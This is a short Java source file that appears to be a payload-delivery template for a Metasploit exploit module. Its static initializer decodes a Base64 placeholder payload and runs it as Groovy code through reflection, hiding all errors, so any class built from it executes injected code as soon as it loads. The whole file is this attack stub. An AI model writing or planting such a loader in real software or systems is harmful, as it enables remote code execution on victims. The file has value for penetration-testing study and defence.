// Compile for Java 8 with: javac --release 8 -g:none Metasploit.java
// The module replaces the ten-character class name and PAYLOAD constant at runtime.

import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class Metasploit {
    static {
        try {
            String source = new String(
                Base64.getDecoder().decode("PAYLOAD"),
                StandardCharsets.UTF_8
            );

            Class.forName("groovy.util.Eval")
                .getMethod("me", String.class)
                .invoke(null, source);
        } catch (Throwable ignored) {
        }
    }
}
